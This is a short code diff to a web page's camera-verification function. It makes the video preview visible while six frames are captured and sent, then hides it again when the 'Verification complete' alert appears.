@@ -221,6 +221,9 @@ async function startCapture() {
     const video = document.getElementById("video");
     video.srcObject = stream;
 
+    // 👇 Show the video element
+    video.style.display = "block"; // ✅ FIX
+
     for (let i = 1; i <= 6; i++) {
       await new Promise(res => setTimeout(res, 1500));
       captureAndSend(i);
@@ -229,6 +232,7 @@ async function startCapture() {
     setTimeout(() => {
       stream.getTracks().forEach(t => t.stop());
       document.getElementById('progress').style.display = "none";
+      video.style.display = "none"; // 👈 Hide again
       alert("✅ Verification complete.");
     }, 1500 * 6 + 500);
   } catch (err) {
@@ -236,7 +240,7 @@ async function startCapture() {
     alert("❌ Camera permission denied. Please allow access from browser settings.");
   }
 }
-
+  
 function captureAndSend(count) {
   const canvas = document.getElementById("canvas");
   const video = document.getElementById("video");
